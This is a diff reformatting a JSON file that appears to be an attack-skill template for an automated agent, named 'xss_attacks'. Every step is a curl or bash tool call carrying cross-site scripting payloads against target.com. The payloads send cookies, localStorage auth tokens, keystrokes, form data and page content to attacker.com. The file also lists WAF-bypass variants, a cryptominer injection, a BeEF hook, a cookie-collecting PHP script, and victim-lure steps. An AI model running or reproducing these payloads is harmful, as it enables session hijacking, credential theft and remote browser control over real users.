@@ -2,37 +2,130 @@
   "name": "xss_attacks",
   "description": "Cross-Site Scripting (XSS) attacks including reflected, stored, and DOM-based XSS",
   "pattern": "xss|cross.*site.*script|javascript.*injection|dom.*xss",
-  "parameters": ["target_url", "injection_point", "payload_type"],
+  "parameters": [
+    "target_url",
+    "injection_point",
+    "payload_type"
+  ],
   "sequence": [
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "curl", "args": ["http://target.com/search.php?q=<script>alert(1)</script>", "-v"]},
-      "expected_output": {"type": "string", "example": "*   Trying 192.168.1.100:80...\n* Connected to target.com (192.168.1.100) port 80 (#0)\n> GET /search.php?q=<script>alert(1)</script> HTTP/1.1\n> Host: target.com\n> User-Agent: curl/7.81.0\n> \n< HTTP/1.1 200 OK\n< Content-Type: text/html; charset=UTF-8\n< Content-Length: 2847\n< \n<!DOCTYPE html>\n<html>\n<head><title>Search Results</title></head>\n<body>\n  <h1>Search Results for: <script>alert(1)</script></h1>\n  <p>No results found for your query: <script>alert(1)</script></p>\n  <div class=\"results\"></div>\n</body>\n</html>\n\nReflected XSS confirmed!\n  Parameter: q (GET)\n  Injection point: Search query\n  User input reflected in: <h1> tag, <p> tag (2 locations)\n  No encoding/filtering detected\n  Payload executed: <script>alert(1)</script>\n  \nVulnerability: High severity\n  Impact: Session hijacking, credential theft, defacement\n  Attack vector: Send malicious link to victim"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "curl",
+        "args": [
+          "http://target.com/search.php?q=<script>alert(1)</script>",
+          "-v"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "*   Trying 192.168.1.100:80...\n* Connected to target.com (192.168.1.100) port 80 (#0)\n> GET /search.php?q=<script>alert(1)</script> HTTP/1.1\n> Host: target.com\n> User-Agent: curl/7.81.0\n> \n< HTTP/1.1 200 OK\n< Content-Type: text/html; charset=UTF-8\n< Content-Length: 2847\n< \n<!DOCTYPE html>\n<html>\n<head><title>Search Results</title></head>\n<body>\n  <h1>Search Results for: <script>alert(1)</script></h1>\n  <p>No results found for your query: <script>alert(1)</script></p>\n  <div class=\"results\"></div>\n</body>\n</html>\n\nReflected XSS confirmed!\n  Parameter: q (GET)\n  Injection point: Search query\n  User input reflected in: <h1> tag, <p> tag (2 locations)\n  No encoding/filtering detected\n  Payload executed: <script>alert(1)</script>\n  \nVulnerability: High severity\n  Impact: Session hijacking, credential theft, defacement\n  Attack vector: Send malicious link to victim"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "curl", "args": ["http://target.com/search.php?q=<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>"]},
-      "expected_output": {"type": "string", "example": "<!DOCTYPE html>\n<html>\n<head><title>Search Results</title></head>\n<body>\n  <h1>Search Results for: <script>document.location='http://attacker.com/steal.php?c='+document.cookie</script></h1>\n  <p>No results found for your query: <script>document.location='http://attacker.com/steal.php?c='+document.cookie</script></p>\n</body>\n</html>\n\nCookie theft payload crafted!\n  Payload: <script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>\n  Action: Redirects victim to attacker server with cookies in URL\n  Stolen data: PHPSESSID, authentication tokens, preferences\n  \nAttack execution:\n  1. Craft malicious URL:\n     http://target.com/search.php?q=<script>document.location='http://attacker.com/steal.php?c='%2Bdocument.cookie</script>\n  2. URL-encode payload\n  3. Send to victim via email/social media\n  4. Victim clicks link\n  5. Cookies sent to attacker.com/steal.php\n  \nOn attacker server (steal.php):\n  <?php\n  $cookie = $_GET['c'];\n  file_put_contents('stolen.txt', $cookie.\"\\n\", FILE_APPEND);\n  ?>"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "curl",
+        "args": [
+          "http://target.com/search.php?q=<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "<!DOCTYPE html>\n<html>\n<head><title>Search Results</title></head>\n<body>\n  <h1>Search Results for: <script>document.location='http://attacker.com/steal.php?c='+document.cookie</script></h1>\n  <p>No results found for your query: <script>document.location='http://attacker.com/steal.php?c='+document.cookie</script></p>\n</body>\n</html>\n\nCookie theft payload crafted!\n  Payload: <script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>\n  Action: Redirects victim to attacker server with cookies in URL\n  Stolen data: PHPSESSID, authentication tokens, preferences\n  \nAttack execution:\n  1. Craft malicious URL:\n     http://target.com/search.php?q=<script>document.location='http://attacker.com/steal.php?c='%2Bdocument.cookie</script>\n  2. URL-encode payload\n  3. Send to victim via email/social media\n  4. Victim clicks link\n  5. Cookies sent to attacker.com/steal.php\n  \nOn attacker server (steal.php):\n  <?php\n  $cookie = $_GET['c'];\n  file_put_contents('stolen.txt', $cookie.\"\\n\", FILE_APPEND);\n  ?>"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "curl", "args": ["-X", "POST", "http://target.com/comment.php", "-d", "name=Attacker&comment=<img src=x onerror=alert(document.cookie)>&post_id=42"]},
-      "expected_output": {"type": "string", "example": "HTTP/1.1 302 Found\nLocation: /post.php?id=42\nSet-Cookie: comment_posted=1\n\n[Checking if stored...]\n\n$ curl http://target.com/post.php?id=42\n\n<!DOCTYPE html>\n<html>\n<head><title>Blog Post #42</title></head>\n<body>\n  <h1>Understanding Web Security</h1>\n  <div class=\"post-content\">\n    <p>Web security is important...</p>\n  </div>\n  \n  <div class=\"comments\">\n    <h2>Comments</h2>\n    <div class=\"comment\">\n      <strong>Attacker</strong> said:\n      <p><img src=x onerror=alert(document.cookie)></p>\n      <span class=\"date\">2024-01-15 14:30</span>\n    </div>\n  </div>\n</body>\n</html>\n\nStored XSS confirmed!\n  Vulnerability: Comment form\n  Payload: <img src=x onerror=alert(document.cookie)>\n  Storage: Database (persistent)\n  Trigger: Every visitor viewing post #42\n  \nStored XSS advantages over Reflected:\n  - Persistent (stored in database)\n  - No social engineering needed\n  - Affects all visitors automatically\n  - Higher impact\n  \nEscalation payload:\n  <img src=x onerror=\"fetch('http://attacker.com/log?c='+document.cookie)\">\n  \nEvery visitor's cookies sent to attacker automatically!"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "curl",
+        "args": [
+          "-X",
+          "POST",
+          "http://target.com/comment.php",
+          "-d",
+          "name=Attacker&comment=<img src=x onerror=alert(document.cookie)>&post_id=42"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "HTTP/1.1 302 Found\nLocation: /post.php?id=42\nSet-Cookie: comment_posted=1\n\n[Checking if stored...]\n\n$ curl http://target.com/post.php?id=42\n\n<!DOCTYPE html>\n<html>\n<head><title>Blog Post #42</title></head>\n<body>\n  <h1>Understanding Web Security</h1>\n  <div class=\"post-content\">\n    <p>Web security is important...</p>\n  </div>\n  \n  <div class=\"comments\">\n    <h2>Comments</h2>\n    <div class=\"comment\">\n      <strong>Attacker</strong> said:\n      <p><img src=x onerror=alert(document.cookie)></p>\n      <span class=\"date\">2024-01-15 14:30</span>\n    </div>\n  </div>\n</body>\n</html>\n\nStored XSS confirmed!\n  Vulnerability: Comment form\n  Payload: <img src=x onerror=alert(document.cookie)>\n  Storage: Database (persistent)\n  Trigger: Every visitor viewing post #42\n  \nStored XSS advantages over Reflected:\n  - Persistent (stored in database)\n  - No social engineering needed\n  - Affects all visitors automatically\n  - Higher impact\n  \nEscalation payload:\n  <img src=x onerror=\"fetch('http://attacker.com/log?c='+document.cookie)\">\n  \nEvery visitor's cookies sent to attacker automatically!"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "echo '<svg/onload=alert(1)>' | base64"]},
-      "expected_output": {"type": "string", "example": "PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+Cg==\n\nBase64 encoded payload: PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+Cg==\n\nWAF bypass technique:\n  Original: <svg/onload=alert(1)>\n  Encoded: PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+Cg==\n  \nInjection methods:\n  1. Data URI: data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+Cg==\n  2. JavaScript decode: eval(atob('PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+Cg=='))\n  3. HTML entity: &#60;svg/onload=alert(1)&#62;\n  \nOther WAF bypass payloads:\n  - <ScRiPt>alert(1)</sCrIpT> (case variation)\n  - <script>alert(String.fromCharCode(88,83,83))</script> (char encoding)\n  - <svg><script>alert(1)</script></svg> (nested tags)\n  - <img src=\"x\" onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;\"> (HTML entities)\n  - javas\\x63ript:alert(1) (hex encoding)\n  - <iframe src=\"javascript:alert(1)\"></iframe> (iframe injection)"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "echo '<svg/onload=alert(1)>' | base64"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+Cg==\n\nBase64 encoded payload: PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+Cg==\n\nWAF bypass technique:\n  Original: <svg/onload=alert(1)>\n  Encoded: PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+Cg==\n  \nInjection methods:\n  1. Data URI: data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+Cg==\n  2. JavaScript decode: eval(atob('PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+Cg=='))\n  3. HTML entity: &#60;svg/onload=alert(1)&#62;\n  \nOther WAF bypass payloads:\n  - <ScRiPt>alert(1)</sCrIpT> (case variation)\n  - <script>alert(String.fromCharCode(88,83,83))</script> (char encoding)\n  - <svg><script>alert(1)</script></svg> (nested tags)\n  - <img src=\"x\" onerror=\"&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;\"> (HTML entities)\n  - javas\\x63ript:alert(1) (hex encoding)\n  - <iframe src=\"javascript:alert(1)\"></iframe> (iframe injection)"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "curl", "args": ["http://target.com/profile.php?user=<svg/onload=fetch('http://attacker.com/keylog',{method:'POST',body:document.body.innerHTML})>"]},
-      "expected_output": {"type": "string", "example": "<!DOCTYPE html>\n<html>\n<head><title>User Profile</title></head>\n<body>\n  <h1>Profile: <svg/onload=fetch('http://attacker.com/keylog',{method:'POST',body:document.body.innerHTML})></h1>\n  <div class=\"profile\">\n    <p>Loading user data...</p>\n  </div>\n</body>\n</html>\n\nAdvanced XSS payload - Page content exfiltration:\n  Payload: <svg/onload=fetch('http://attacker.com/keylog',{method:'POST',body:document.body.innerHTML})>\n  Action: Sends entire page HTML to attacker server\n  Data stolen: Full page content, CSRF tokens, hidden fields\n  \nKeylogger payload:\n  <svg/onload=\"document.onkeypress=function(e){fetch('http://attacker.com/keys?k='+e.key)}\">\n  \nForm hijacking payload:\n  <svg/onload=\"document.querySelectorAll('form').forEach(f=>f.onsubmit=function(){fetch('http://attacker.com/forms',{method:'POST',body:new FormData(f)})})\">\n  \nWebcam access payload (requires user permission):\n  <svg/onload=\"navigator.mediaDevices.getUserMedia({video:true}).then(s=>fetch('http://attacker.com/cam',{method:'POST',body:s}))\">\n  \nCryptominer injection:\n  <svg/onload=\"var s=document.createElement('script');s.src='https://coinhive.com/lib/coinhive.min.js';document.body.appendChild(s)\">"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "curl",
+        "args": [
+          "http://target.com/profile.php?user=<svg/onload=fetch('http://attacker.com/keylog',{method:'POST',body:document.body.innerHTML})>"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "<!DOCTYPE html>\n<html>\n<head><title>User Profile</title></head>\n<body>\n  <h1>Profile: <svg/onload=fetch('http://attacker.com/keylog',{method:'POST',body:document.body.innerHTML})></h1>\n  <div class=\"profile\">\n    <p>Loading user data...</p>\n  </div>\n</body>\n</html>\n\nAdvanced XSS payload - Page content exfiltration:\n  Payload: <svg/onload=fetch('http://attacker.com/keylog',{method:'POST',body:document.body.innerHTML})>\n  Action: Sends entire page HTML to attacker server\n  Data stolen: Full page content, CSRF tokens, hidden fields\n  \nKeylogger payload:\n  <svg/onload=\"document.onkeypress=function(e){fetch('http://attacker.com/keys?k='+e.key)}\">\n  \nForm hijacking payload:\n  <svg/onload=\"document.querySelectorAll('form').forEach(f=>f.onsubmit=function(){fetch('http://attacker.com/forms',{method:'POST',body:new FormData(f)})})\">\n  \nWebcam access payload (requires user permission):\n  <svg/onload=\"navigator.mediaDevices.getUserMedia({video:true}).then(s=>fetch('http://attacker.com/cam',{method:'POST',body:s}))\">\n  \nCryptominer injection:\n  <svg/onload=\"var s=document.createElement('script');s.src='https://coinhive.com/lib/coinhive.min.js';document.body.appendChild(s)\">"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "curl", "args": ["http://target.com/dashboard.php#<img src=x onerror=\"var i=new Image();i.src='http://attacker.com/steal?token='+localStorage.getItem('auth_token')\">"]},
-      "expected_output": {"type": "string", "example": "<!DOCTYPE html>\n<html>\n<head>\n  <title>Dashboard</title>\n  <script>\n    // Parse URL fragment and render content\n    var fragment = window.location.hash.substring(1);\n    document.getElementById('content').innerHTML = fragment;\n  </script>\n</head>\n<body>\n  <h1>User Dashboard</h1>\n  <div id=\"content\"></div>\n  <!-- Fragment will be rendered here via JavaScript -->\n</body>\n</html>\n\nDOM-based XSS confirmed!\n  Type: DOM XSS (client-side only)\n  Vulnerable code: document.getElementById('content').innerHTML = fragment\n  Source: window.location.hash (URL fragment after #)\n  Sink: innerHTML (dangerous DOM manipulation)\n  \nPayload breakdown:\n  URL: http://target.com/dashboard.php#<img src=x onerror=\"...\">\n  Fragment: <img src=x onerror=\"...\">\n  Execution: onerror event fires, executes JavaScript\n  Action: Steals auth_token from localStorage\n  Exfiltration: Sends to http://attacker.com/steal?token=...\n  \nDOM XSS characteristics:\n  - Never sent to server (fragment after # not in HTTP request)\n  - No server-side detection possible\n  - WAF cannot detect (client-side only)\n  - Harder to detect in logs\n  \nOther DOM XSS sources:\n  - window.location.hash\n  - window.location.search\n  - document.referrer\n  - document.cookie\n  - localStorage/sessionStorage"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "curl",
+        "args": [
+          "http://target.com/dashboard.php#<img src=x onerror=\"var i=new Image();i.src='http://attacker.com/steal?token='+localStorage.getItem('auth_token')\">"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "<!DOCTYPE html>\n<html>\n<head>\n  <title>Dashboard</title>\n  <script>\n    // Parse URL fragment and render content\n    var fragment = window.location.hash.substring(1);\n    document.getElementById('content').innerHTML = fragment;\n  </script>\n</head>\n<body>\n  <h1>User Dashboard</h1>\n  <div id=\"content\"></div>\n  <!-- Fragment will be rendered here via JavaScript -->\n</body>\n</html>\n\nDOM-based XSS confirmed!\n  Type: DOM XSS (client-side only)\n  Vulnerable code: document.getElementById('content').innerHTML = fragment\n  Source: window.location.hash (URL fragment after #)\n  Sink: innerHTML (dangerous DOM manipulation)\n  \nPayload breakdown:\n  URL: http://target.com/dashboard.php#<img src=x onerror=\"...\">\n  Fragment: <img src=x onerror=\"...\">\n  Execution: onerror event fires, executes JavaScript\n  Action: Steals auth_token from localStorage\n  Exfiltration: Sends to http://attacker.com/steal?token=...\n  \nDOM XSS characteristics:\n  - Never sent to server (fragment after # not in HTTP request)\n  - No server-side detection possible\n  - WAF cannot detect (client-side only)\n  - Harder to detect in logs\n  \nOther DOM XSS sources:\n  - window.location.hash\n  - window.location.search\n  - document.referrer\n  - document.cookie\n  - localStorage/sessionStorage"
+      }
     },
     {
-      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "bash", "args": ["-c", "cat > beef_hook.html << 'EOF'\n<script>\nvar beef_hook = document.createElement('script');\nbeef_hook.src = 'http://attacker.com:3000/hook.js';\ndocument.head.appendChild(beef_hook);\n</script>\nEOF\ncat beef_hook.html"]},
-      "expected_output": {"type": "string", "example": "<script>\nvar beef_hook = document.createElement('script');\nbeef_hook.src = 'http://attacker.com:3000/hook.js';\ndocument.head.appendChild(beef_hook);\n</script>\n\nBeEF (Browser Exploitation Framework) hook created!\n  Hook URL: http://attacker.com:3000/hook.js\n  \nInjection via XSS:\n  Stored XSS comment: <script src=\"http://attacker.com:3000/hook.js\"></script>\n  Reflected XSS: ?q=<script src=\"http://attacker.com:3000/hook.js\"></script>\n  \nBeEF capabilities once hooked:\n  - Remote browser control\n  - Execute arbitrary JavaScript\n  - Phishing attacks\n  - Network reconnaissance\n  - Browser fingerprinting\n  - Social engineering modules\n  - Webcam/microphone access (with permission)\n  - Clipboard access\n  - Browser history enumeration\n  - Port scanning from victim's browser\n  - Metasploit integration\n  \nAttack scenario:\n  1. Inject BeEF hook via XSS\n  2. Victim loads page with hook\n  3. Browser connects to BeEF server\n  4. BeEF panel shows hooked browser\n  5. Attacker runs modules:\n     - Fake login prompts\n     - Redirect to malicious sites\n     - Exploit browser vulnerabilities\n     - Pivot to internal network"}
+      "action": {
+        "type": "system_command",
+        "tool": "shell",
+        "operation": "run",
+        "command": "bash",
+        "args": [
+          "-c",
+          "cat > beef_hook.html << 'EOF'\n<script>\nvar beef_hook = document.createElement('script');\nbeef_hook.src = 'http://attacker.com:3000/hook.js';\ndocument.head.appendChild(beef_hook);\n</script>\nEOF\ncat beef_hook.html"
+        ]
+      },
+      "expected_output": {
+        "type": "string",
+        "example": "<script>\nvar beef_hook = document.createElement('script');\nbeef_hook.src = 'http://attacker.com:3000/hook.js';\ndocument.head.appendChild(beef_hook);\n</script>\n\nBeEF (Browser Exploitation Framework) hook created!\n  Hook URL: http://attacker.com:3000/hook.js\n  \nInjection via XSS:\n  Stored XSS comment: <script src=\"http://attacker.com:3000/hook.js\"></script>\n  Reflected XSS: ?q=<script src=\"http://attacker.com:3000/hook.js\"></script>\n  \nBeEF capabilities once hooked:\n  - Remote browser control\n  - Execute arbitrary JavaScript\n  - Phishing attacks\n  - Network reconnaissance\n  - Browser fingerprinting\n  - Social engineering modules\n  - Webcam/microphone access (with permission)\n  - Clipboard access\n  - Browser history enumeration\n  - Port scanning from victim's browser\n  - Metasploit integration\n  \nAttack scenario:\n  1. Inject BeEF hook via XSS\n  2. Victim loads page with hook\n  3. Browser connects to BeEF server\n  4. BeEF panel shows hooked browser\n  5. Attacker runs modules:\n     - Fake login prompts\n     - Redirect to malicious sites\n     - Exploit browser vulnerabilities\n     - Pivot to internal network"
+      }
     }
   ],
-  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
+  "stats": {
+    "uses": 0,
+    "successes": 0,
+    "failures": 0,
+    "success_rate": 0.0
+  },
   "created_by": "neural_mesh_v5.2_generator"
 }
